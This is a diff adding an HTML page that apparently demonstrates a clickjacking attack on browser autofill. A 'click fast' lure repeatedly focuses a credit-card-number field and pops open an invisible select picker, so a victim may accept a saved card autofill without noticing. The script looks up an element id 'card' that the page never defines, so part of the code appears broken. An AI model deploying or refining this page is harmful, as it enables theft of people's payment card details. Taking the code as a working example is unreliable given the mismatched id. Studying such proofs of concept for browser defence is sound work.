@@ -1,0 +1,48 @@
+<h1>Click fast as you can :)</h1>
+<br>
+<input class="input" style="font-size: 10px;" autocomplete="cc-number">
+
+<select id="select">
+    <option>.......................................................................</option>
+    <option>.......................................................................</option>
+    <option>................................FastClick..............................</option>
+    <option>.......................................................................</option>
+    <option>.......................................................................</option>
+</select>
+
+<style>
+#card,
+#select {
+    opacity: 0;
+    pointer-events: none;
+    position: absolute;
+}
+
+.input{
+  position: fixed;
+  left: 3%;
+}
+</style>
+
+<script>
+document.addEventListener("click", () => {
+    const input = document.getElementById("card");
+    const select = document.getElementById("select");
+
+    // Trigger autocomplete input
+    setTimeout(() => {
+        input.focus();
+    }, 200);
+
+    // Trigger native select picker
+    setTimeout(() => {
+        if (select.showPicker) {
+            try {
+                select.showPicker();
+            } catch (e) {
+                console.error("showPicker:", e);
+            }
+        }
+    }, 100);
+});
+</script>
